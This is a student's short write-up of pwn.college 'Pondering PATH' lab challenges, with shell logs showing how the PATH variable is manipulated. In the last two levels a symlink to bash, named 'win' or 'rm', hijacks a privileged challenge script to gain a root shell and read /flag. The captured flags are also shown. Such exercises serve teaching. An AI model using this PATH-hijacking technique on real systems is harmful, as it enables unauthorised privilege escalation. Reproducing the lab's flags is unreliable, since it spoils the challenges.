# Pondering PATH
## The PATH variable
### Learnings: Learnt how to use the PATH command
```
PATH=""
hacker@path~the-path-variable:~$ ls
ssh-entrypoint: ls: No such file or directory
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{s4IR1SQPk12h_Ns-suNJxENpnXX.dZzNwUDL1kTN0czW}
```

## Setting Path
Followed the instructions to reach the flag.
```
PATH=/challenge/more_commands/
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{glp4u1GsmGQWKWoVg3XScWjR7G2.dVzNyUDL1kTN0czW}
```

## Adding Commands
### References: Youtube
 It was a bit hard as I could not properly figure out what to be done, had to refer youtube video for help
```
 ln -s /usr/bin/bash ./win
hacker@path~adding-commands:~$ PATH=/home/hacker/:$PATH
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
root@path~adding-commands:~# cat /flag
pwn.college{8p3DsIjFLy7BX6eMHCqAzE_m7mb.dZzNyUDL1kTN0czW}
```


## Hijacking Commands
Similar to the previous one , was a bit difficult.
```
 ln -s /usr/bin/bash ./rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker/:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker//rm. Executing!
/flag: line 1: pwn.college{kLZv9c000GBjtgZ-ZyU6nET5or8.ddzNyUDL1kTN0czW}
```
